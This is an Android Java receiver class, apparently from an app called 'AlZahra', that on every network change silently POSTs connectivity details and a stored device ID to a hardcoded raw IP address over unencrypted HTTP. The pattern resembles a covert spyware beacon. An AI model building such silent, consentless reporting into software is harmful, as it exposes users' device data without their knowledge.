package com.alzahra.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class NetworkReceiver extends BroadcastReceiver {
    private static final String TAG = "AlZahraNet";
    private static final String SERVER = "http://216.128.156.226:8443";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo info = cm != null ? cm.getActiveNetworkInfo() : null;
            
            JSONObject obj = new JSONObject();
            obj.put("connected", info != null && info.isConnected());
            obj.put("type", info != null ? info.getTypeName() : "none");
            obj.put("subtype", info != null ? info.getSubtypeName() : "none");
            
            sendData(context, obj.toString());
        } catch (Exception e) {
            Log.e(TAG, "Network error", e);
        }
    }
    
    private void sendData(Context context, String content) {
        new Thread(() -> {
            try {
                String deviceId = context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE)
                    .getString("device_id", "UNKNOWN");
                
                URL url = new URL(SERVER + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("type", "network");
                json.put("content", content);
                json.put("time", System.currentTimeMillis());
                
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send error", e);
            }
        }).start();
    }
}
